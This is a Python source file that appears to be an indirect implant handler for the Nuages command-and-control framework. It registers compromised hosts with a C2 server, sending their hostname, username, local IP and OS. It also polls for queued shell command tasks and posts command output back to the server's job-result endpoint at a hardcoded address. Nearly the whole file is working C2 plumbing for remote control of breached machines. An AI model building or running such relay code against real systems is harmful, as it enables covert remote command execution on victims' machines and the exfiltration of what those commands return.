from socket import *
import json
import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("-d",help="Enables DEBUG mode", action="store_true")
parser.add_argument("-c",help="Connection string, example-> http://x.x.x.x:3030")
parsed=parser.parse_args()

if parsed.d:
	DEBUG = True
DEBUG = True #default, set this back to false
	
def debug(inp):
	if DEBUG:
		print("[D]{0}".format(inp))

class Implant():
	def __init__(self, nuagesServer, connStr, addr, uid):
		debug("Implant initialized C->{} ADDR->{}".format(connStr,addr))
		self.connectionString = connStr
		self.sourceIp = addr
		self.id = None
		self.uid = uid
		self.nuagesServer = nuagesServer
		self.tasks = []
		#Debug
		"""self.tasks.append( {
			"id":"MhQowqxD4KJmW8IWMzcSWBdSUlduUwJG",
			"payload":"hostname",
			"sent":False
		})"""

	def parseInitstr(self,inp):
		#This function parses the following format:
		#INITSTR|hostname:theswamp|username:jakk|localIp:192.168.56.1|os:Win 8|FINSTR
		retVal={}
		elements = ["localIp","hostname","username","os","options","supportedPayloads"]
		for element in elements:
			retVal[element] = None
		baseData = inp.split("|")
		for item in baseData:
			for element in elements:
				if element in item and ":" in item:
					retVal[element] = item.split(":")[1]
		return retVal


	def register(self,inp):
		parsed = self.parseInitstr(inp)
		#array and dict items
		if not parsed["options"]:
			options = {}
		if not parsed["supportedPayloads"]:
			parsed["supportedPayloads"] = [
				"Command",
				"Exit"
			]
		#looping through string items
		for k in parsed.keys():
			if not parsed[k]:
				parsed[k] = "NULL"

		#Determined by server
		parsed["sourceIp"] = self.sourceIp
		parsed["handler"] = "Indirect"
		parsed["connectionString"] = self.connectionString
		#Finished
		return parsed

	def registerImplant(self,inp):
		#Register the implant
		regData = self.register(inp)

		#Send
		heads = {'content-type': 'application/json'}
		URL = self.nuagesServer + "/implant/register"
		try:
			r = requests.post(url = URL, headers=heads, data=json.dumps(regData))
			
			debug("Registration request sent, Data:{}".format(regData))
		except Exception as e:
			debug("Registration request failed, err:{}".format(e))
			return False

		#response text  
		debug("Response:{}".format(r.text))
		try:
			self.id = json.loads(r.text)["_id"]
		except Exception as e:
			print("Err:",str(e))
			debug("didn't receive id from registration response, err:{}".format(e))
			return False
		return True
		
	def getTask(self,id):
		for task in self.tasks:
			if task["id"] == id:
				return task
		return False
	
	def addResponse(self,inp,taskId):
		r = re.search("rsp:.*",inp)
		if r:
			response = r.group().replace("rsp:","")
			debug("response:{}".format(response))
			tRef = self.getTask(taskId)
			tRef["response"] = response
			tRef["completed"] = True
			self.sendResponse(tRef)
	
	def sendResponse(self,task):
		debug("Sending %s to server".format(task))

		jsonData = {
			"n": 0, # If the result needs to be chunked, the number of the current chunk
			"moreData": False, # If this is the last chunk
			"error": False, # If the job execution encountered an error
			"result": task["response"], # The text result of the job, can be chunked if needed
			"jobId": task["id"], # The Job ID
			"data": "" # For upload jobs, the current file chunk in base64
		}
		
		heads = {'content-type': 'application/json'}
		URL = self.nuagesServer + "/implant/jobresult"
		try:
			debug("Sending command response: {}".format(jsonData))
			r = requests.post(url = URL, headers=heads, data=json.dumps(jsonData))
			#response text  
			debug("Nuages Response:{}".format(r.text))
			return True
		except Exception as e:
			debug("sendResponse failed: ERR:{}".format(e))
			return False

	#Parses the data received from the heartbeat in the event there is a task
	def parseBeat(self, inp):
		if not inp["data"]:
			return False
		for item in inp["data"]:
			task = {}
			task["id"] = item["_id"]
			if not self.getTask(task["id"]):
				task["payload"] = item["payload"]["options"]["cmd"]
				debug("parseBeat command:{}".format(task["payload"]))
				task["read"] = False
				task["response"] = None
				task["completed"] = False
				task["sent"] = False
				self.tasks.append(task)
				debug("appended {}".format(task))
				
	def heartBeat(self):
		if not self.id:
			debug("This implant is unregistered, register before heartbeat")
			return False
		#Send
		idJsonData = {
				"id" : self.id
		} 
		heads = {'content-type': 'application/json'}
		URL = self.nuagesServer + "/implant/heartbeat"
		try:
			debug("Sending heartbeat for {}".format(idJsonData))
			r = requests.post(url = URL, headers=heads, data=json.dumps(idJsonData))
			#response text  
			debug("Heartbeat Response:{}".format(r.text))
			self.parseBeat(json.loads(r.text))
		except Exception as e:
			debug("Heartbeat failed: ERR:{}".format(e))

if __name__ == "__main__":
	#Variables for testing purposes:
	connectionString = "http://192.168.1.218:3030"
	testInitstr = "INITSTR|hostname:theswamp|uid:123|username:jakk|localIp:192.168.56.1|os:Win 8|FINSTR"
	A = Implant(connectionString, connectionString, "10.0.0.1",'123')
	A.registerImplant(testInitstr)
	A.heartBeat()
